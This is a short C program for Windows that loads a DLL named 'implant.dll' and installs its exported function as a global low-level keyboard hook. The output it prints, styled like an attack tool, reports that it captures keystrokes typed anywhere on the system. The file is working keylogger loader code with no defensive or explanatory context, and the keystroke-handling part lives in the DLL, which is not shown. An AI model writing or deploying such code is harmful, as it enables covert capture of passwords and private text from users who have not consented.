#include <windows.h>
#include <stdio.h>
#include <conio.h>

#pragma comment(lib, "user32.lib")
int main() {
    HMODULE hDll = LoadLibraryA("implant.dll");
    if (!hDll) {
        printf("LoadLibrary failed: %lu\n", GetLastError());
        return 1;
    }

    HOOKPROC proc = (HOOKPROC)GetProcAddress(hDll, "LowLevelKeyboardProc");
    if (!proc) {
        printf("GetProcAddress failed: %lu\n", GetLastError());
        FreeLibrary(hDll);
        return 1;
    }

    HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, proc, hDll, 0);
    if (!hook) {
        printf("SetWindowsHookEx failed: %lu (run as admin?)\n", GetLastError());
        FreeLibrary(hDll);
        return 1;
    }

    printf("[+] Low-level keyboard hook installed\n");
    printf("[*] Type anywhere → should see output here\n");
    printf("[*] Press ESC to quit\n\n");

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        if (msg.message == WM_KEYDOWN && msg.wParam == VK_ESCAPE) {
            break;
        }
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hook);
    FreeLibrary(hDll);
    printf("[*] Hook removed\n");
    return 0;
}